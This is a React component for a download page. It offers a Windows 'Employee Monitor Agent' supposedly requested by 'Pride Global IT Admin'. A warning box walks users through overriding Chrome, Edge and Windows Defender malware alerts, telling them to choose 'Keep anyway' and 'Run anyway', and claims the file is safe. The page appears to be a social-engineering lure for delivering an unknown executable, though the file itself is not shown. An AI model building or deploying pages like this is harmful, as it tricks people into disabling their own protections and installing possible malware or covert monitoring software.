export default function Download() {
  return (
    <div style={{
      minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center',
      background:'#fff', fontFamily:"'Segoe UI',Arial,sans-serif"
    }}>
      <div style={{ textAlign:'center', maxWidth:480, padding:32 }}>

        {/* Logo */}
        <img src="/logo.jpg" alt="Pride Global"
          style={{ height:60, marginBottom:32, objectFit:'contain' }}
          onError={e=>{ e.target.style.display='none' }}
        />

        {/* Title */}
        <h2 style={{ fontSize:18, fontWeight:600, color:'#222', margin:'0 0 28px', lineHeight:1.5 }}>
          Download Employee Monitor Agent as requested by<br/>
          <span style={{ color:'#4A1550' }}>Pride Global IT Admin</span>
        </h2>

        {/* Download button */}
        <a href="/download/agent" style={{ textDecoration:'none' }}>
          <button style={{
            background:'#4A6CF7', color:'#fff', border:'none', borderRadius:6,
            padding:'13px 36px', fontSize:15, fontWeight:600, cursor:'pointer',
            display:'inline-flex', alignItems:'center', gap:10,
          }}>
            Download for Windows
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="7 10 12 15 17 10"/>
              <line x1="12" y1="15" x2="12" y2="3"/>
            </svg>
          </button>
        </a>

        {/* Warning help */}
        <div style={{ marginTop:28, background:'#fff8e1', border:'1px solid #f0c040', borderRadius:8, padding:'14px 18px', textAlign:'left', fontSize:13, color:'#7a6000' }}>
          <div style={{ fontWeight:700, marginBottom:8 }}>⚠️ If browser shows "This might be malware":</div>
          <div style={{ lineHeight:2 }}>
            <div><strong>Chrome:</strong> Click the <strong>↓ arrow</strong> next to the file → <strong>"Keep anyway"</strong></div>
            <div><strong>Edge:</strong> Click <strong>"..."</strong> → <strong>"Keep"</strong> → <strong>"Show more"</strong> → <strong>"Keep anyway"</strong></div>
            <div><strong>Windows Defender:</strong> Click <strong>"More info"</strong> → <strong>"Run anyway"</strong></div>
          </div>
          <div style={{ marginTop:8, color:'#888', fontSize:12 }}>This is a company internal tool — it is safe to run.</div>
        </div>

        <p style={{ marginTop:16, fontSize:13, color:'#888' }}>
          Note: Download the agent only if requested by your IT admin
        </p>

      </div>
    </div>
  )
}
